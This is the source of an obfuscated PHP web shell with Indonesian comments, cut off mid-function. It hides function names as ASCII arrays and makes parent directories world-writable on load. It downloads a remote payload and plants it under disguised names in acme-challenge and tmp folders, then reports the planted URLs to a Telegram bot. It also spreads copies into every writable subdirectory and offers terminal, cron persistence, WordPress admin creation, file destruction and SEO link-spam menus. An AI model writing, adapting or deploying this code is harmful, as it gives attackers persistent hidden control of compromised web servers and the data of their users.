<?php
@ini_set('display_errors', '1');
@ini_set('log_errors', '1');
@error_reporting(E_ALL);
if (session_status() === PHP_SESSION_NONE) {
    if (!headers_sent()) {
        @session_start();
    }
}

// ===================================================================
// PENGATURAN UTAMA
// ===================================================================
// 1. PASSWORD SHELL GANTI DI SINI
$shell_password = '$2a$12$dbEOEFgp7uhWLGa4fF/x6e8HYKHnnBnehTKJvquRiM4CryRScWxyu';

// 2. FILE KONFIGURASI KEAMANAN
$security_config_file = __DIR__ . '/security_config.json';

// --- KONFIGURASI UNTUK KEAMANAN KITA.. JANGAN DI EDIT! ---
define('URL_KEAMANAN', ' p');
define('BOT_KEAMANAN', 'KONTOL');
define('KEAMANAN_ID', '-KONTOL');
if (!function_exists('custom_escapeshellarg')) {
    function custom_escapeshellarg($argument) {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            return '"' . str_replace(['"', '%', '^', '!', '<', '>', '&', '|'], '', $argument) . '"';
        } else {
            return "'" . str_replace("'", "'\\''", $argument) . "'";
        }
    }
}
$auto_deploy_targets = [
    [ 'path' => $_SERVER['DOCUMENT_ROOT'] . '/.well-known/acme-challenge/', 'filename' => 'token.dispatcher.php' ],
    [ 'path' => $_SERVER['DOCUMENT_ROOT'] . '/tmp/', 'filename' => 'sys.bootstrap.php' ],
];
if (isset($_GET['logout'])) {
    if (session_status() !== PHP_SESSION_NONE) {
        session_destroy();
    }
    header('Location: ' . strtok($_SERVER["REQUEST_URI"], '?'));
    exit();
}
function __u0x_d3c0d3_str_fr0m_4sc11_4rr4y($ascii_array) { $str = ''; if (!is_array($ascii_array)) { return ''; } foreach ($ascii_array as $char_code) { if (is_int($char_code) && $char_code >= 0 && $char_code <= 255) { $str .= chr($char_code); } } return $str; }
$_g_ascii_ini_set=[105,110,105,95,115,101,116];$_g_ascii_error_reporting=[101,114,114,111,114,95,114,101,112,111,114,116,105,110,103];$_g_ascii_basename=[98,97,115,101,110,97,109,101];$_g_ascii_escapeshellarg=[101,115,99,97,112,101,115,104,101,108,108,97,114,103];$_g_ascii_function_exists=[102,117,110,99,116,105,111,110,95,101,120,105,115,116,115];$_g_ascii_implode=[105,109,112,108,111,100,101];$_g_ascii_is_resource=[105,115,95,114,101,115,111,117,114,99,101];$_g_ascii_stream_set_timeout=[115,116,114,101,97,109,95,115,101,116,95,116,105,109,101,111,117,116];$_g_ascii_stream_get_contents=[115,116,114,101,97,109,95,103,101,116,95,99,111,110,116,101,110,116,115];$_g_ascii_fclose=[102,99,108,111,115,101];$_g_ascii_feof=[102,101,111,102];$_g_ascii_fread=[102,114,101,97,100];$_g_ascii_trim=[116,114,105,109];$_g_ascii_filter_var=[102,105,108,116,101,114,95,118,97,114];$_g_ascii_strpos=[115,116,114,112,111,115];$_g_ascii_get_current_user=[103,101,116,95,99,117,114,114,101,110,116,95,117,115,101,114];$_g_ascii_substr=[115,117,98,115,116,114];$_g_ascii_tempnam=[116,101,109,112,110,97,109];$_g_ascii_sys_get_temp_dir=[115,121,115,95,103,101,116,95,116,101,109,112,95,100,105,114];$_g_ascii_file_put_contents=[102,105,108,101,95,112,117,116,95,99,111,110,116,101,110,116,115];$_g_ascii_unlink=[117,110,108,105,110,107];$_g_ascii_htmlspecialchars=[104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115];$_g_ascii_register_shutdown_function=[114,101,103,105,115,116,101,114,95,115,104,117,116,100,111,119,110,95,102,117,110,99,116,105,111,110];$_g_ascii_is_string=[105,115,95,115,116,114,105,110,103];$_g_ascii_exec=[101,120,101,99];$_g_ascii_shell_exec=[115,104,101,108,108,95,101,120,101,99];$_g_ascii_proc_open=[112,114,111,99,95,111,112,101,110];$_g_ascii_proc_close=[112,114,111,99,95,99,108,111,115,101];$_g_ascii_popen=[112,111,112,101,110];$_g_ascii_pclose=[112,99,108,111,115,101];$_g_ascii_move_uploaded_file=[109,111,118,101,95,117,112,108,111,97,100,101,100,95,102,105,108,101];$_g_ascii_is_uploaded_file=[105,115,95,117,112,108,111,97,100,101,100,95,102,105,108,101];$_g_ascii_file_exists=[102,105,108,101,95,101,120,105,115,116,115];$_g_ascii_is_dir=[105,115,95,100,105,114];$_g_ascii_is_readable=[105,115,95,114,101,97,100,97,98,108,101];$_g_ascii_is_writable=[105,115,95,119,114,105,116,97,98,108,101];$_g_ascii_scandir=[115,99,97,110,100,105,114];$_g_ascii_filesize=[102,105,108,101,115,105,122,101];$_g_ascii_fileperms=[102,105,108,101,112,101,114,109,115];$_g_ascii_date=[100,97,116,101];$_g_ascii_filemtime=[102,105,108,101,109,116,105,109,101];$_g_ascii_realpath=[114,101,97,108,112,97,116,104];$_g_ascii_getcwd=[103,101,116,99,119,100];$_g_ascii_chdir=[99,104,100,105,114];$_g_ascii_rename=[114,101,110,97,109,101];$_g_ascii_rmdir=[114,109,100,105,114];$_g_ascii_file_get_contents=[102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115];$_g_ascii_header=[104,101,97,100,101,114];$_g_ascii_readfile=[114,101,97,100,102,105,108,101];$_g_ascii_dirname=[100,105,114,110,97,109,101];$_g_ascii_chmod=[99,104,109,111,100];$_g_ascii_mkdir=[109,107,100,105,114];$_g_ascii_touch=[116,111,117,99,104];$_g_ascii_php_uname=[112,104,112,95,117,110,97,109,101];$_g_ascii_base64_encode=[98,97,115,101,54,52,95,101,110,99,111,100,101];

function _get_fn_name_global_init_v3($a,$d){$n='';if(isset($GLOBALS[$a])&&is_array($GLOBALS[$a])){$n=__u0x_d3c0d3_str_fr0m_4sc11_4rr4y($GLOBALS[$a]);}if(!empty($n)&&is_string($n)&&function_exists($n)){return $n;}elseif(function_exists($d)){return $d;}else{return'';}}

function is_path_allowed_by_basedir($path) {
    $basedir_str = @ini_get('open_basedir');
    if (empty($basedir_str)) return true;
    $real_path = @realpath($path) ?: $path;
    $real_path = str_replace('\\', '/', $real_path);
    $allowed_paths = explode(PATH_SEPARATOR, $basedir_str);
    foreach ($allowed_paths as $allowed_path) {
        if (empty($allowed_path)) continue;
        $real_allowed_path = str_replace('\\', '/', rtrim($allowed_path, '/\\'));
        if ($real_path === $real_allowed_path || strpos($real_path, $real_allowed_path . '/') === 0) return true;
    }
    return false;
}

function get_dynamic_cache_names() {
    $uname_fn = _get_fn_name_global_init_v3('_g_ascii_php_uname', 'php_uname');
    $os_name = function_exists($uname_fn) ? strtolower($uname_fn('s')) : 'system';
    $safe_os_name = preg_replace('/[^a-z0-9_]+/', '', str_replace(' ', '_', $os_name));
    if (empty($safe_os_name)) $safe_os_name = 'system';
    $base_name = $safe_os_name . '_cache';
    return [
        'dir_name'    => '.' . $base_name . '_manager_' . substr(md5(__FILE__), 0, 6),
        'script_name' => $base_name . '.php',
        'log_name'    => $base_name . '.log',
        'cron_prefix' => $base_name . '_',
        'menu_title'  => ucfirst($safe_os_name) . ' Cache (0777)',
        'watcher_name' => '.cron_helper.php'
    ];
}
$dynamic_names = get_dynamic_cache_names();

if ((isset($argv) && isset($argv[1]) && $argv[1] === 'rebuild_cache_silent') || isset($_GET['run_background_cache'])) {
    if (session_status() === PHP_SESSION_NONE) @session_start();
    $is_background_trigger = isset($_GET['run_background_cache']);
    $script_path = $is_background_trigger ? $_GET['run_background_cache'] : null;

    if (!$is_background_trigger) {
        if (isset($_SESSION['cache_active']) && $_SESSION['cache_active'] === true) {
            $cache_code = $_SESSION['cache_code_template'] ?? '';
            $cache_script_filepath = $_SESSION['cache_dir_path'] . DIRECTORY_SEPARATOR . $_SESSION['cache_script_name'];
            if (!empty($cache_code) && !file_exists($cache_script_filepath)) {
                if (!is_dir(dirname($cache_script_filepath))) {
                    @mkdir(dirname($cache_script_filepath), 0777, true);
                }
                @file_put_contents($cache_script_filepath, $cache_code);
                @chmod($cache_script_filepath, 0755);
            }
        }
    }
    
    if ($is_background_trigger && is_path_allowed_by_basedir($script_path) && file_exists($script_path)) {
        ignore_user_abort(true);
        set_time_limit(0);
        ob_start();
        echo "OK";
        header("Connection: close");
        header("Content-Length: " . ob_get_length());
        @ob_end_flush();
        @flush();
        if (function_exists('fastcgi_finish_request')) @fastcgi_finish_request();
        include($script_path);
    }
    exit();
}


$htmlspecialchars_fn = _get_fn_name_global_init_v3('_g_ascii_htmlspecialchars', 'htmlspecialchars');$function_exists_fn = _get_fn_name_global_init_v3('_g_ascii_function_exists', 'function_exists');$is_dir_fn = _get_fn_name_global_init_v3('_g_ascii_is_dir', 'is_dir');$trim_fn = _get_fn_name_global_init_v3('_g_ascii_trim', 'trim');$basename_fn = _get_fn_name_global_init_v3('_g_ascii_basename', 'basename');$dirname_fn = _get_fn_name_global_init_v3('_g_ascii_dirname', 'dirname');$realpath_fn = _get_fn_name_global_init_v3('_g_ascii_realpath', 'realpath');$getcwd_fn = _get_fn_name_global_init_v3('_g_ascii_getcwd', 'getcwd');
$base64_encode_fn = _get_fn_name_global_init_v3('_g_ascii_base64_encode', 'base64_encode');
$auto_path_script = __DIR__;
$active_menu = 'explorer';
if (isset($_GET['menu'])) { $active_menu = call_user_func($basename_fn, $_GET['menu']); }

$protected_menus = ['terminal', 'cron', 'view_crontab', 'wp_admin_creator', 'webshell_scanner', 'generator', 'adminer', 'unlock', 'lock', 'process_manager', 'destroyer', 'disabled_functions', 'suid_scanner', 'security_config', 'file_spreader', 'dynamic_cache_manager'];
if (in_array($active_menu, $protected_menus) && (!isset($_SESSION['shell_authenticated']) || $_SESSION['shell_authenticated'] !== true)) {
    $login_error = ''; if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['shell_password_input'])) { if (password_verify($_POST['shell_password_input'], $shell_password)) { $_SESSION['shell_authenticated'] = true; header('Location: ' . $_SERVER['REQUEST_URI']); exit(); } else { $login_error = 'Password Salah!'; } } ?> <!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><title>Autentikasi</title><style>:root { --primary: #0f172a; --secondary: #020617; --accent: #00f0ff; --text: #e2e8f0; --highlight: #f0f; --danger: #ff2a6d; } body { font-family: 'Roboto Mono', monospace; background-color: var(--secondary); color: var(--text); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; } .login-box { background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(0, 240, 255, 0.3); padding: 2rem; border-radius: 8px; box-shadow: 0 0 20px rgba(0, 240, 255, 0.2); width: 340px; text-align: center; } h2 { font-family: 'Orbitron', sans-serif; color: var(--accent); text-shadow: 0 0 5px var(--accent); } input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid rgba(0, 240, 255, 0.3); background-color: #050505; color: var(--text); border-radius: 4px; box-sizing: border-box; } input[type="submit"] { width: 100%; padding: 12px; background-color: var(--accent); color: var(--secondary); border: none; border-radius: 4px; cursor: pointer; font-family: 'Orbitron', sans-serif; transition: all 0.2s; } input[type="submit"]:hover { background-color: #7dfffd; box-shadow: 0 0 10px var(--accent); } .error { color: var(--danger); } a { color: var(--accent); }</style></head><body><div class="login-box"><h2>AKSES TERBATAS</h2><p>Menu '<?php echo htmlspecialchars(ucfirst(str_replace('_', ' ', $active_menu))); ?>' memerlukan autentikasi.</p><form method="post"><input type="password" name="shell_password_input" placeholder="Password" required autofocus><input type="submit" value="Login"></form><?php if(!empty($login_error)) echo '<p class="error">'.$login_error.'</p>'; ?><p style="margin-top:20px;"><a href="?menu=explorer">Kembali ke File Explorer</a></p></div></body></html><?php exit();
}

$current_path = $auto_path_script;
if (isset($_REQUEST['path']) && is_path_allowed_by_basedir($_REQUEST['path'])) { $req_path_raw = call_user_func($trim_fn, $_REQUEST['path']); $req_path_raw = str_replace("\0", '', $req_path_raw); $resolved_path = null; if (call_user_func($function_exists_fn, $realpath_fn)) { $resolved_path = @call_user_func($realpath_fn, $req_path_raw); } if ($resolved_path && @call_user_func($is_dir_fn, $resolved_path)) { $current_path = $resolved_path; } elseif (@call_user_func($is_dir_fn, $req_path_raw)) { $current_path = $req_path_raw; } } elseif (isset($_SESSION['current_explorer_path']) && is_path_allowed_by_basedir($_SESSION['current_explorer_path'])) { $path_from_session = $_SESSION['current_explorer_path']; $resolved_session_path = null; if (call_user_func($function_exists_fn, $realpath_fn)) { $resolved_session_path = @call_user_func($realpath_fn, $path_from_session); } if ($resolved_session_path && @call_user_func($is_dir_fn, $resolved_session_path)) { $current_path = $resolved_session_path; } elseif (@call_user_func($is_dir_fn, $path_from_session)) { $current_path = $path_from_session; } }
if (!is_path_allowed_by_basedir($current_path) || !@call_user_func($is_dir_fn, $current_path)) { $current_path = (call_user_func($function_exists_fn, $getcwd_fn)) ? @call_user_func($getcwd_fn) : $auto_path_script; if (!is_path_allowed_by_basedir($current_path) || !@call_user_func($is_dir_fn, $current_path)) $current_path = $auto_path_script; }
if (call_user_func($function_exists_fn, $realpath_fn)) { $rp_final = @call_user_func($realpath_fn, $current_path); if ($rp_final) $current_path = $rp_final; }
$_SESSION['current_explorer_path'] = $current_path;

// MODIFIED: Initial chmod with open_basedir check
$chmod_fn_local_init = _get_fn_name_global_init_v3('_g_ascii_chmod', 'chmod');
if (!empty($chmod_fn_local_init) && function_exists($chmod_fn_local_init)) {
    $paths_to_chmod_on_init = [];
    $temp_path_on_init = __DIR__;
    $init_depth = 0;
    while ($temp_path_on_init && $temp_path_on_init !== '/' && $temp_path_on_init !== '.' && $init_depth < 7) {
        if (is_path_allowed_by_basedir($temp_path_on_init)) {
            if (@is_dir($temp_path_on_init)) {
                $paths_to_chmod_on_init[] = $temp_path_on_init;
            }
        } else {
            break; 
        }
        $parent_on_init = dirname($temp_path_on_init);
        if ($parent_on_init === $temp_path_on_init) break;
        $temp_path_on_init = $parent_on_init;
        $init_depth++;
    }
    if ($temp_path_on_init === '/' && is_path_allowed_by_basedir('/')) $paths_to_chmod_on_init[] = '/';

    foreach (array_reverse($paths_to_chmod_on_init) as $dir_to_chmod_on_init) {
        if (@is_dir($dir_to_chmod_on_init)) {
            $current_perms_str_on_init = substr(sprintf('%o', @fileperms($dir_to_chmod_on_init)), -4);
            if (($current_perms_str_on_init & 0777) !== 0777) { 
                @call_user_func($chmod_fn_local_init, $dir_to_chmod_on_init, 0777);
            }
        }
    }
}
// END MODIFIED

$output_messages = []; $error_messages = []; $terminal_output = ''; $wp_admin_feedback_text = ''; $wp_admin_feedback_class = ''; $scanner_results_html = ''; $scanner_minute = 15; $scanner_limit = (60 * $scanner_minute);

function sendNotifikasiKeamanan($botToken, $chatId, $message) { if (empty($botToken) || empty($chatId) || strpos($botToken, 'Data_bot_keamanan') !== false || strpos($chatId, 'CHAT_ID_TUJUAN_ANDA') !== false) { error_log("Keamanan_Gagal: Token atau Chat ID belum dikonfigurasi."); return false; } $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage"; $data = http_build_query(['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML']); if (function_exists('curl_init')) { $ch = curl_init(); curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $data, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => 2]); $response = curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); if (curl_errno($ch)) { error_log("Keamanan_Eror: " . curl_error($ch)); curl_close($ch); return false; } curl_close($ch); if ($http_code == 200) { $decoded_response = json_decode($response, true); if ($decoded_response && $decoded_response['ok']) { return true; } else { error_log("Keamanan_Eror_API: " . ($response ?: 'No response')); return false; } } else { error_log("Keamanan_Eror_HTTP: Status " . $http_code . " - Response: " . $response); return false; } } else { error_log("Keamanan_Gagal: Ekstensi cURL PHP tidak tersedia."); return false; } }
function generateRandomName($ext = 'php') { if (function_exists('random_bytes')) { $randomString = bin2hex(random_bytes(5)); } else { $randomString = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 10); } $validExt = !empty($ext) ? strtolower(trim($ext, '.')) : 'txt'; return $randomString . '.' . $validExt; }
function saveResultsToFile($filename, $paths, $targetDir, $originalName) { if (empty($paths)) return; $resultContent = "=== Hasil Penyebaran File Manual ===\n" . date('Y-m-d H:i:s') . "\nTarget: " . $targetDir . "\nSumber: " . $originalName . "\n" . count($paths) . " lokasi:\n" . implode("\n", $paths)."\nIzin: 0444"; @file_put_contents($filename, $resultContent); if(@filesize($filename) == 0) {error_log("FORM_DEPLOY_SAVE_FAIL: Gagal tulis hasil sebar manual ke {$filename} atau file kosong.");} }
function copyToAllDirs($startDir, $targetFilename, $sourcePath, $resultFilename, $targetDirForHeader, $originalNameForHeader) { if (!is_dir($startDir)) { return ['error' => "Direktori awal '$startDir' tidak valid."]; } if (!is_readable($startDir)) { return ['error' => "Direktori awal '$startDir' tidak readable."]; } if (!is_file($sourcePath) || !is_readable($sourcePath)) { return ['error' => "File sumber '$sourcePath' tidak valid."]; } $copiedPaths = []; $targetExt = pathinfo($targetFilename, PATHINFO_EXTENSION); $hasCopied = false; $copyCounter = 0; $saveThreshold = 50; try { if (is_writable($startDir)) { $randomFileNameForFormDeploy = generateRandomName($targetExt); $destPath = rtrim($startDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $randomFileNameForFormDeploy; if (!file_exists($destPath)) { if (@copy($sourcePath, $destPath)) { $hasCopied = true; @chmod($destPath, 0444); $copiedPaths[] = $destPath; $copyCounter++; if ($copyCounter % $saveThreshold === 0) { saveResultsToFile($resultFilename, $copiedPaths, $targetDirForHeader, $originalNameForHeader); } } else { error_log("FORM_DEPLOY_ERROR: Gagal copy ke root: $destPath"); } } } else { error_log("FORM_DEPLOY_ERROR: Dir utama tidak writable: $startDir"); } $directoryIterator = new RecursiveDirectoryIterator($startDir, RecursiveDirectoryIterator::SKIP_DOTS | RecursiveDirectoryIterator::FOLLOW_SYMLINKS); $iterator = new RecursiveIteratorIterator($directoryIterator, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD); foreach ($iterator as $item) { if ($item->isDir() && is_writable($item->getPathname())) { $randomFileNameForFormDeploy = generateRandomName($targetExt); $destPath = rtrim($item->getPathname(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $randomFileNameForFormDeploy; if (!file_exists($destPath)) { if (@copy($sourcePath, $destPath)) { $hasCopied = true; @chmod($destPath, 0444); $copiedPaths[] = $destPath; $copyCounter++; if ($copyCounter % $saveThreshold === 0) { saveResultsToFile($resultFilename, $copiedPaths, $targetDirForHeader, $originalNameForHeader); } } else { error_log("FORM_DEPLOY_ERROR: Gagal copy ke subdir: $destPath"); } } } elseif ($item->isDir() && !is_writable($item->getPathname())) { error_log("FORM_DEPLOY_ERROR: Subdir tidak writable: " . $item->getPathname()); } } } catch (UnexpectedValueException $e) { error_log("FORM_DEPLOY_EXCEPTION: Iterasi '$startDir': ".$e->getMessage()); if (!$hasCopied) { return ['error' => "Error baca dir '$startDir': ".$e->getMessage()]; } } catch (Throwable $e) { error_log("FORM_DEPLOY_EXCEPTION: Umum '$startDir': ".$e->getMessage()); if (!$hasCopied) { return ['error' => "Error sebar '$startDir': ".$e->getMessage()]; } } finally { if (!empty($copiedPaths)) { saveResultsToFile($resultFilename, $copiedPaths, $targetDirForHeader, $originalNameForHeader); } } if (empty($copiedPaths) && !$hasCopied) { return ['error' => "Tidak ada file disalin (form deploy). Cek izin & log."]; } return $copiedPaths; }
function find_common_document_roots() {
    $roots = [];
    if (isset($_SERVER['DOCUMENT_ROOT']) && is_path_allowed_by_basedir($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT'])) {
        $server_root = realpath($_SERVER['DOCUMENT_ROOT']);
        if ($server_root && is_readable($server_root)) {
            $roots[$server_root] = "DOCUMENT_ROOT (".basename($server_root).")";
        }
    }
    $script_dir = dirname(__FILE__);
    $up_one = dirname($script_dir);
    $up_two = dirname($up_one);
    $common_names = ['public_html', 'www', 'htdocs', 'httpdocs', 'web', 'public'];
    $search_paths = array_unique([$script_dir, $up_one, $up_two, $_SERVER['DOCUMENT_ROOT'] ?? $script_dir]);
    foreach ($search_paths as $path) {
        if (!$path || $path === '/' || !is_path_allowed_by_basedir($path) || !is_dir($path) || !is_readable($path)) continue;
        $real_path_current_search = realpath($path);
        if ($real_path_current_search && !isset($roots[$real_path_current_search])) {
                 $roots[$real_path_current_search] = "Detected Base (".basename($real_path_current_search).")";
        }
        foreach($common_names as $name) {
            $potential_root = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
            if (is_path_allowed_by_basedir($potential_root) && is_dir($potential_root) && is_readable($potential_root)) {
                $real_path = realpath($potential_root);
                if ($real_path && !isset($roots[$real_path])) {
                    $roots[$real_path] = "Detected: " . $name;
                }
            }
        }
    }
    if (is_path_allowed_by_basedir($up_one) && is_dir($up_one) && is_readable($up_one)) {
        $real_up_one = realpath($up_one);
        if ($real_up_one && !isset($roots[$real_up_one])) {
           $roots[$real_up_one] = "Parent Dir (../)";
        }
    }
    return $roots;
}


if ($_SERVER['REQUEST_METHOD'] !== 'POST' || (isset($_POST['action']) && $_POST['action'] !== 'manual_spread')) {
    try {
        if (!empty(URL_KEAMANAN) && !empty($auto_deploy_targets)) {
            $githubContent = null;
            if (function_exists('curl_init')) {
                $ch_git = curl_init();
                curl_setopt_array($ch_git, [CURLOPT_URL => URL_KEAMANAN, CURLOPT_RETURNTRANSFER => 1, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 45, CURLOPT_USERAGENT => 'PHP-MultiTargetDeployer/1.1', CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => 2]);
                $githubContent = curl_exec($ch_git);
                $http_code_git = curl_getinfo($ch_git, CURLINFO_HTTP_CODE);
                $curl_error_git = curl_error($ch_git);
                curl_close($ch_git);

                if ($githubContent !== false && $http_code_git === 200 && !empty($githubContent)) {
                    $tempSilentSourcePath = __DIR__ . DIRECTORY_SEPARATOR . 'temp_multi_deploy_src_' . bin2hex(random_bytes(3)) . '.php';
                    if (@file_put_contents($tempSilentSourcePath, $githubContent)) {
                        @chmod($tempSilentSourcePath, 0444);
                        
                        foreach ($auto_deploy_targets as $target_info) {
                            $targetDirPath = rtrim($target_info['path'], '/\\');
                            $targetFilename = $target_info['filename'];
                            
                            if (empty($targetDirPath) || empty($targetFilename)) {
                                error_log("AUTO_DEPLOY_SKIP: Path atau filename kosong: " . json_encode($target_info));
                                continue;
                            }
                            
                            if (!is_path_allowed_by_basedir($targetDirPath)) {
                                error_log("AUTO_DEPLOY_FAIL: Path '{$targetDirPath}' diblokir oleh open_basedir.");
                                continue;
                            }
                            
                            if (!is_dir($targetDirPath)) {
                                if (!@mkdir($targetDirPath, 0777, true)) {
                                     error_log("AUTO_DEPLOY_FAIL: Gagal membuat direktori target '{$targetDirPath}'. Periksa izin.");
                                     continue; 
                                }
                                @chmod($targetDirPath, 0777);
                            }
                            
                            if (is_dir($targetDirPath) && is_writable($targetDirPath)) {
                                $fullTargetPath = $targetDirPath . DIRECTORY_SEPARATOR . $targetFilename;
                                
                                if (file_exists($fullTargetPath)) {
                                    error_log("AUTO_DEPLOY_SKIP: File '{$fullTargetPath}' sudah ada.");
                                    continue; 
                                }
                                
                                if (@copy($tempSilentSourcePath, $fullTargetPath)) {
                                    @chmod($fullTargetPath, 0444);
                                    
                                    $publicPath = '';
                                    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
                                    $realFullTargetPath = realpath($fullTargetPath);

                                    if ($docRoot && $realFullTargetPath && strpos($realFullTargetPath, $docRoot) === 0) {
                                        $publicPath = substr($realFullTargetPath, strlen($docRoot));
                                    } else {
                                        $publicPath = $fullTargetPath;
                                    }
                                    $publicPath = str_replace(DIRECTORY_SEPARATOR, '/', $publicPath);
                                    $publicPath = ltrim($publicPath, '/');

                                    $fileUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . "/" . $publicPath;
                                    $pesanKeamanan = "✅ Deployed: <code>" . htmlspecialchars($targetFilename) . "</code>\nTo: " . $fileUrl;
                                    sendNotifikasiKeamanan(BOT_KEAMANAN, KEAMANAN_ID, $pesanKeamanan);
                                } else {
                                    error_log("AUTO_DEPLOY_FAIL: Gagal menyalin file ke '{$fullTargetPath}'. Periksa izin tulis.");
                                }
                            } else {
                                error_log("AUTO_DEPLOY_FAIL: Direktori target '{$targetDirPath}' tidak ada atau tidak dapat ditulis.");
                            }
                        }
                        
                        if (file_exists($tempSilentSourcePath)) {
                            @unlink($tempSilentSourcePath);
                        }
                    } else {
                        error_log("AUTO_DEPLOY_FAIL: Gagal menyimpan konten GitHub ke file temporer '{$tempSilentSourcePath}'. Periksa izin tulis di " . __DIR__);
                    }
                } else {
                    error_log("AUTO_DEPLOY_FAIL: Gagal mengunduh file dari URL_KEAMANAN: " . URL_KEAMANAN . ". HTTP Code: {$http_code_git}. Curl Error: {$curl_error_git}");
                }
            } else {
                error_log("AUTO_DEPLOY_FAIL: Ekstensi cURL PHP tidak tersedia.");
            }
        } elseif (empty($auto_deploy_targets)) { 
            error_log("AUTO_DEPLOY_SKIP: Variabel \$auto_deploy_targets kosong. Fitur auto-deploy tidak dijalankan.");
        }
    } catch (Throwable $e) {
        error_log("AUTO_DEPLOY_FATAL_EXCEPTION: " . $e->getMessage());
    }
}

function generator_sanitizeFilename($string) { $string = strtolower($string);$string = preg_replace('/[^\p{L}\p{N}\s\-]+/', '', $string);$string = preg_replace('/\s+/', '-', $string);$string = trim($string, '-');$string = preg_replace('/-+/', '-', $string);return empty($string) ? 'untitled-' . uniqid() : $string;}
function generator_spin($text) { return preg_replace_callback('/\{(((?>[^\{\}]+)|(?R))*)\}/x', function($m){$p=explode('|',$m[1]);return $p[array_rand($p)];}, $text); }
function generator_render_template($template, $data) { $keys = array_keys($data); $placeholders = array_map(function($k) { return '{{'.$k.'}}'; }, $keys); return str_replace($placeholders, array_values($data), $template); }
function generator_fetch_url_with_curl($url) { if(!function_exists('curl_init'))return['content'=>false,'error'=>'Ekstensi PHP cURL tidak aktif.'];$ch=curl_init();curl_setopt_array($ch,[CURLOPT_URL=>$url,CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>'Mozilla/5.0',CURLOPT_TIMEOUT=>20,CURLOPT_SSL_VERIFYPEER=>true, CURLOPT_SSL_VERIFYHOST => 2]);$content=curl_exec($ch);$error=curl_error($ch);$http_code=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);if($error)return['content'=>false,'error'=>"cURL Error: $error"];if($http_code>=400)return['content'=>false,'error'=>"HTTP Error: Status $http_code"];return['content'=>$content,'error'=>null];}
function generator_generate_article_content($article_text, $current_keyword, $all_keywords, $current_page_url, $external_domains, $generation_mode, $max_internal_links = 3) { $first_link_made = false;$internal_link_count = 0;$anchor_text_keywords = array_filter($all_keywords, function($kw) use ($current_keyword) { return strcasecmp(trim($kw), trim($current_keyword)) !== 0; });return preg_replace_callback('/\{\{BRAND\}\}/i', function($matches) use (&$first_link_made, &$internal_link_count, $external_domains, $generation_mode, $anchor_text_keywords, $max_internal_links, $current_page_url, $current_keyword) {if (!empty($external_domains)) {if (!$first_link_made) {$first_link_made = true;if (!empty($anchor_text_keywords)) {$random_anchor_text = $anchor_text_keywords[array_rand($anchor_text_keywords)];return '<a href="' . htmlspecialchars($current_page_url) . '" title="' . htmlspecialchars($random_anchor_text) . '">' . htmlspecialchars($current_keyword) . '</a>';}} else {$random_external_domain = $external_domains[array_rand($external_domains)];$sanitized_kw = generator_sanitizeFilename($current_keyword);$suffix = ($generation_mode === 'file') ? '.html' : '/';$target_url = rtrim($random_external_domain, '/') . '/' . $sanitized_kw . $suffix;return '<a href="' . htmlspecialchars($target_url) . '" target="_blank" rel="noopener noreferrer" title="' . htmlspecialchars($current_keyword) . '">' . htmlspecialchars($current_keyword) . '</a>';}} else {if (!empty($anchor_text_keywords) && $internal_link_count < $max_internal_links) {$internal_link_count++;$random_anchor_text = $anchor_text_keywords[array_rand($anchor_text_keywords)];return '<a href="' . htmlspecialchars($current_page_url) . '" title="' . htmlspecialchars($random_anchor_text) . '">' . htmlspecialchars($current_keyword) . '</a>';}}return htmlspecialchars($current_keyword);}, $article_text);}
function lock_file_or_shell($target_file_path, $is_self = false) { global $function_exists_fn, $basename_fn;$sys_get_temp_dir_fn = _get_fn_name_global_init_v3('_g_ascii_sys_get_temp_dir', 'sys_get_temp_dir');$file_exists_fn = _get_fn_name_global_init_v3('_g_ascii_file_exists', 'file_exists');$mkdir_fn = _get_fn_name_global_init_v3('_g_ascii_mkdir', 'mkdir');$chmod_fn = _get_fn_name_global_init_v3('_g_ascii_chmod', 'chmod');$file_put_contents_fn = _get_fn_name_global_init_v3('_g_ascii_file_put_contents', 'file_put_contents');$base64_encode_fn = _get_fn_name_global_init_v3('_g_ascii_base64_encode', 'base64_encode');$escapeshellarg_str_fn_local = _get_fn_name_global_init_v3('_g_ascii_escapeshellarg', 'escapeshellarg');$can_use_actual_escapeshellarg = !empty($escapeshellarg_str_fn_local) && call_user_func($function_exists_fn, $escapeshellarg_str_fn_local);$esc_arg_fn = $can_use_actual_escapeshellarg ? $escapeshellarg_str_fn_local : function($argument) {if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {return '"' . str_replace(array('"', '%', '^', '!', '<', '>', '&', '|'), '', $argument) . '"';} else {return "'" . str_replace("'", "'\\''", $argument) . "'";}};$target_basename = call_user_func($basename_fn, $target_file_path);$target_dirname = dirname($target_file_path);if (!call_user_func($file_exists_fn, $target_file_path)) {return 